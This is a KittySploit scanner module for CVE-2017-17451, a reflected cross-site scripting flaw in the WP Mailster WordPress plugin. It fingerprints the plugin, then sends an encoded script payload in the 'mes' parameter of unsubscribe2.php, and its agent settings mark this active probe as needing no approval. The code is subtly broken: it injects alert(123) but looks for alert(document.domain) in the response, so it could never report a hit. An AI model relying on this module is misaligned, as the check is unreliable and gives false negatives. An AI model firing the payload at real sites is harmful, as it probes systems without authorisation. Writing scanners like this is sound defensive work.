#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Mailster 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Mailster <=1.5.4 - Cross-Site Scripting Detection',
        'description': 'WordPress Mailster 1.5.4 and before contains a cross-site scripting vulnerability in the unsubscribe handler via the mes parameter to view/subscription/unsubscribe2.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'wordpress', 'xss', 'wp-plugin', 'packetstorm', 'wpmailster', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wordpress.org/plugins/wp-mailster/#developers',
            'https://packetstormsecurity.com/files/145222/WordPress-WP-Mailster-1.5.4.0-Cross-Site-Scripting.html',
            'https://wpvulndb.com/vulnerabilities/8973',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-17451',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2017-17451',
    }

    def run(self):
        path = '/wp-content/plugins/wp-mailster/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('WP Mailster =',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/wp-mailster/view/subscription/unsubscribe2.php?mes=%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Mailster <=1.5.4 - Cross-Site Scripting detected', path=path)
            return True
        return False

